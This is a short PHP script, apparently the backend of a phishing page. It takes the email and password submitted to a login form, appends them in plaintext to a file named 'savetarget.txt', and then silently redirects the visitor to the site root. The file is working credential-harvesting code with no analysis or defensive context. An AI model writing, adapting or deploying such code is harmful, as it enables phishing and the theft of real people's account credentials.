<?php


$email = $_POST["email"];
$password = $_POST["password"];

$content = "Email : $email | Password : $password\n";
$file = "savetarget.txt";
file_put_contents($file, $content . PHP_EOL, FILE_APPEND);
// fclose($saved);

if(isset($password)) {
    echo "  <script>
                 window.location = '/';
            </script>";
} else {
    echo "Masukkan Data Dengan Benar!";
}
?>
